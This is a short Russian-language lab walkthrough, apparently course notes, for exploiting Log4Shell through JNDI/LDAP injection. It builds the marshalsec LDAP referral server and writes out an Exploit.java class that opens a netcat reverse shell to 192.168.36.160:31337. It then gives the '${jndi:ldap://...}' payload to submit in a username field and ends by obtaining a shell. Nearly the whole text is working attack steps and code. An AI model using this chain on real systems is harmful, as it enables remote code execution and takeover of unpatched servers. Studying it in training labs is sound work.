Требуется подготовить инфраструктуру
устанавливаем java 1.8.0_181 (jdk-8u181-linux-x64.tar.gz) (http://planetone.online/downloads/java/jdk/)

sudo mkdir /usr/lib/jvm
cd /usr/lib/jvm
sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz # При необходимости модифицируем путь
sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac 
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws

устанавливаем sudo apt install maven ( ошибка память - от рута echo >/etc/security/limits.d/systemd.conf "* hard nofile 1048576")

клонируем репозиторий  [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

собираем mvn clean package -DskipTests

после сборки запускаем ldap сервер java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "[http](https://learn.cyber-ed.ru/mod/glossary/showentry.php?eid=58&displayformat=dictionary "Глоссарий по модулю: HTTP")://<attacker-server-[ip](https://learn.cyber-ed.ru/mod/glossary/showentry.php?eid=61&displayformat=dictionary "Глоссарий по модулю: IP")>:8000/#[Exploit](https://learn.cyber-ed.ru/mod/glossary/showentry.php?eid=45&displayformat=dictionary "Глоссарий по модулю: Exploit")"

создаем новую директорию и создаем файл Exploit.java
```

public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 192.168.36.160 31337");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
компилируем javac [Exploit](https://learn.cyber-ed.ru/mod/glossary/showentry.php?eid=45&displayformat=dictionary "Глоссарий по модулю: Exploit").java

запускаем http сервер на порту 8000 (указанный при запуске ldap)

отправляем нагрузку в строку имени пользователя ${jndi:ldap://100.100.2.252:1389/Exploit\}
![](../../attachment/Pasted%20image%2020250605110536.png)

![](../../attachment/Pasted%20image%2020250605110550.png)![](../../attachment/Pasted%20image%2020250605110556.png)
Получаем шелл

![](../../attachment/Pasted%20image%2020250605110608.png)